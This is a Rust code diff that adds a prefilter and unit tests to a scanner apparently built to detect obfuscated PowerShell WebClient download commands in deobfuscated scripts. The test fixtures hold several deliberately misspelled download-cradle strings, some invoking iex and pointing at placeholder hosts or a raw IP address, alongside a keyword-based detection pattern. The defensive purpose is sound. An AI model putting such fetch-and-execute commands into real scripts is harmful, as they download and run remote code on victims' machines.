@@ -1397,6 +1397,10 @@ fn emit_python_download_with_dst(
 }
 
 fn scan_typo_webclient_downloads(deobfuscated: &str, env: &mut Environment) {
+    if !has_typo_webclient_download_atom(deobfuscated) {
+        return;
+    }
+
     let mut known: std::collections::HashSet<String> = env
         .traits
         .iter()
@@ -1418,6 +1422,41 @@ fn scan_typo_webclient_downloads(deobfuscated: &str, env: &mut Environment) {
         }
         emit_typo_webclient_download(&url, env, &mut known);
     }
+}
+
+fn has_typo_webclient_download_atom(text: &str) -> bool {
+    let has_url = [
+        b"http:".as_slice(),
+        b"https:".as_slice(),
+        b"ftp:".as_slice(),
+        b"file:".as_slice(),
+    ]
+    .iter()
+    .any(|atom| contains_ascii_case_insensitive_atom(text, atom));
+    if !has_url {
+        return false;
+    }
+
+    [
+        b"download".as_slice(),
+        b"dwnload".as_slice(),
+        b"wnload".as_slice(),
+        b"ownload".as_slice(),
+        b"down".as_slice(),
+        b"ebc".as_slice(),
+    ]
+    .iter()
+    .any(|atom| contains_ascii_case_insensitive_atom(text, atom))
+}
+
+fn contains_ascii_case_insensitive_atom(text: &str, atom: &[u8]) -> bool {
+    !atom.is_empty()
+        && text.as_bytes().windows(atom.len()).any(|window| {
+            window
+                .iter()
+                .zip(atom)
+                .all(|(byte, atom_byte)| byte.eq_ignore_ascii_case(atom_byte))
+        })
 }
 
 fn find_call_url_literals(text: &str, names: &[&str]) -> Vec<String> {
@@ -2061,6 +2100,30 @@ fn typo_method_distance_limit(method: &str) -> usize {
         4
     } else {
         3
+    }
+}
+
+#[cfg(test)]
+mod typo_webclient_prefilter_tests {
+    use super::has_typo_webclient_download_atom;
+
+    #[test]
+    fn prefilter_allows_known_typo_webclient_shapes() {
+        for text in [
+            "powershell (New-Ojec Sstem.Net.WebCliet).DownloadFle('https://drop.example/a')",
+            "powershll (Nw-ject Sstem.Net.Welint).Dwnloadile('https://raw.example/b')",
+            "set x=iex(\"w-ject t.bient).wnloadring('http://172.104.150.66/p')\")",
+            "eh (Ne-bet -peme tem.et.ebCet).de('http://tvde.m/e/pt.zp')",
+        ] {
+            assert!(has_typo_webclient_download_atom(text), "blocked: {text}");
+        }
+    }
+
+    #[test]
+    fn prefilter_blocks_text_without_webclient_download_atoms() {
+        assert!(!has_typo_webclient_download_atom(
+            "set a.b.c=1\r\necho https://docs.example/reference\r\nfor %i in (a.b.c) do echo %i"
+        ));
     }
 }
 
